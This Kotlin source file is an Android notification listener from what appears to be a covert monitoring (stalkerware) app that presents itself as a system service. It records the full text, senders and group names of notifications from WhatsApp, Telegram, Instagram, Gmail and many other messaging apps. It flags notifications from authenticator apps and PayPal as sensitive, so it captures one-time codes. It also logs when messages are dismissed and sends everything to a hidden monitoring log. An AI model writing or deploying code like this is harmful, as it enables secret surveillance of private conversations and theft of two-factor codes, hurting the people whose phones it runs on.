package com.system.service.services

import android.app.Notification
import android.os.Build
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.system.service.core.MonitorCore
import com.system.service.core.Storage

/**
 * Enhanced Notification Listener — captures ALL incoming notifications.
 * Extracts full message content from messaging apps including:
 * - WhatsApp messages (individual + group)
 * - SMS/MMS text
 * - Email subject + preview
 * - Telegram messages
 * - Instagram DMs
 * - Any other notification with text content
 *
 * REQUIRES: User must enable in Settings → Notifications → Notification access.
 */
class NotifListenerService : NotificationListenerService() {

    companion object {
        @Volatile
        var instance: NotifListenerService? = null
            private set

        // Apps with rich notification content worth deep-extracting
        private val MESSAGING_APPS = setOf(
            "com.whatsapp", "com.whatsapp.w4b",                    // WhatsApp
            "org.telegram.messenger", "org.thunderdog.chalern",     // Telegram
            "com.instagram.android",                                 // Instagram
            "com.facebook.orca", "com.facebook.mlite",              // Messenger
            "com.snapchat.android",                                  // Snapchat
            "com.google.android.apps.messaging",                     // Google Messages
            "com.samsung.android.messaging",                         // Samsung Messages
            "com.discord",                                           // Discord
            "com.Slack",                                             // Slack
            "com.microsoft.teams",                                   // Teams
            "com.viber.voip",                                        // Viber
            "com.tencent.mm",                                        // WeChat
            "jp.naver.line.android",                                 // LINE
            "com.skype.raider",                                      // Skype
            "com.google.android.gm",                                 // Gmail
            "com.microsoft.office.outlook",                          // Outlook
            "com.yahoo.mobile.client.android.mail",                  // Yahoo Mail
        )

        // Sensitive notification sources
        private val SENSITIVE_APPS = setOf(
            "com.google.android.apps.authenticator2",  // Google Auth
            "com.authy.authy",                         // Authy
            "com.microsoft.identity",                   // MS Authenticator
            "com.amazon.mShop.android.shopping",        // Amazon
            "com.paypal.android.p2pmobile",             // PayPal
        )
    }

    private val lastNotifMap = mutableMapOf<String, Long>()

    override fun onListenerConnected() {
        super.onListenerConnected()
        instance = this

        MonitorCore.start(applicationContext)

        // Capture existing active notifications on connect
        try {
            val active = activeNotifications
            if (active != null && active.isNotEmpty()) {
                for (sbn in active.takeLast(5)) {
                    processNotification(sbn, isHistory = true)
                }
            }
        } catch (_: Exception) { }
    }

    override fun onListenerDisconnected() {
        instance = null
        super.onListenerDisconnected()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null || MonitorCore.isPaused) return
        processNotification(sbn, isHistory = false)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Track notification dismissals for messaging apps (indicates user read it)
        if (sbn == null || MonitorCore.isPaused) return
        val pkg = sbn.packageName ?: return
        if (pkg == packageName) return

        if (pkg in MESSAGING_APPS) {
            val ts = timestamp()
            val appName = getAppName(pkg)
            log("[$ts] [NOTIF_READ] $appName notification dismissed")
        }
    }

    private fun processNotification(sbn: StatusBarNotification, isHistory: Boolean) {
        val pkg = sbn.packageName ?: return
        if (pkg == packageName) return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        // Extract all available text fields
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
        val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
        val infoText = extras.getCharSequence(Notification.EXTRA_INFO_TEXT)?.toString() ?: ""
        val summaryText = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString() ?: ""
        val conversationTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString() ?: ""

        // Extract messaging style messages (WhatsApp group messages, etc.)
        val messages = extractMessages(extras)

        // Build the most complete content possible
        val fullContent = buildString {
            if (bigText.isNotBlank()) {
                append(bigText)
            } else if (text.isNotBlank()) {
                append(text)
            }
            if (messages.isNotBlank() && messages != text && messages != bigText) {
                if (isNotEmpty()) append(" | ")
                append(messages)
            }
            if (subText.isNotBlank()) {
                if (isNotEmpty()) append(" [")
                append(subText)
                if (isNotEmpty()) append("]")
            }
        }

        if (fullContent.isBlank() && title.isBlank()) return

        // Deduplicate: skip if same content within 2 seconds
        val dedupKey = "$pkg:$title:${fullContent.hashCode()}"
        val now = System.currentTimeMillis()
        val lastTime = lastNotifMap[dedupKey]
        if (lastTime != null && now - lastTime < 2000) return
        lastNotifMap[dedupKey] = now

        // Prune old dedup entries
        if (lastNotifMap.size > 200) {
            val cutoff = now - 60_000
            lastNotifMap.entries.removeIf { it.value < cutoff }
        }

        val ts = timestamp()
        val appName = getAppName(pkg)
        val tag = when {
            pkg in SENSITIVE_APPS -> "🔐 SENSITIVE_NOTIF"
            pkg in MESSAGING_APPS -> "💬 MSG"
            else -> "NOTIF"
        }

        val groupInfo = if (conversationTitle.isNotBlank()) " [Group: $conversationTitle]" else ""
        val prefix = if (isHistory) "[HISTORY] " else ""

        val logLine = "[$ts] [$tag] $prefix$appName$groupInfo | $title: $fullContent"

        // Truncate if extremely long
        val finalLog = if (logLine.length > 2000) logLine.take(2000) + "...[TRUNCATED]" else logLine
        log(finalLog)
    }

    /**
     * Extract individual messages from MessagingStyle notifications.
     * This captures full conversation history from WhatsApp, Telegram, etc.
     */
    private fun extractMessages(extras: Bundle): String {
        try {
            // Try EXTRA_MESSAGES (API 24+)
            val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
            if (messages != null && messages.isNotEmpty()) {
                return messages.mapNotNull { msg ->
                    if (msg is Bundle) {
                        val sender = msg.getCharSequence("sender")?.toString() ?: ""
                        val text = msg.getCharSequence("text")?.toString() ?: ""
                        if (text.isNotBlank()) {
                            if (sender.isNotBlank()) "$sender: $text" else text
                        } else null
                    } else null
                }.joinToString(" → ")
            }

            // Try EXTRA_TEXT_LINES (for inbox-style notifications)
            val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
            if (textLines != null && textLines.isNotEmpty()) {
                return textLines.mapNotNull { it?.toString() }.joinToString(" | ")
            }
        } catch (_: Exception) { }

        return ""
    }

    private fun getAppName(pkg: String): String {
        return try {
            val pm = packageManager
            val appInfo = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (_: Exception) {
            pkg.substringAfterLast(".")
        }
    }

    private fun log(content: String) {
        try {
            if (MonitorCore.isRunning) {
                MonitorCore.enqueueLog(content)
            } else {
                Storage.init(applicationContext)
                Storage.appendLog(content)
            }
        } catch (_: Exception) { }
    }

    private fun timestamp(): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
    }
}
